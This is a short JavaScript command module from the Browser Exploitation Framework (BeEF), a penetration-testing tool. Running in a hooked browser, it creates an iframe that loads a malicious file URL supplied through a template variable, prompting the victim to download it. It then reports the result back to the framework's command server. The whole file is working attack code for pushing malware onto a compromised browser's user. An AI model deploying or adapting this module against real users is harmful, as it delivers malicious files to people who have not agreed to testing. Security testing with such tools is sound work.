//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {


function retfile(url) {
var f = document.createElement("iframe");
f.setAttribute("id", "theFrame");
document.body.appendChild(f);
document.getElementById("theFrame").src = url;
}
retfile("<%== @mal_file_uri %>");
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Prompted for File");
});
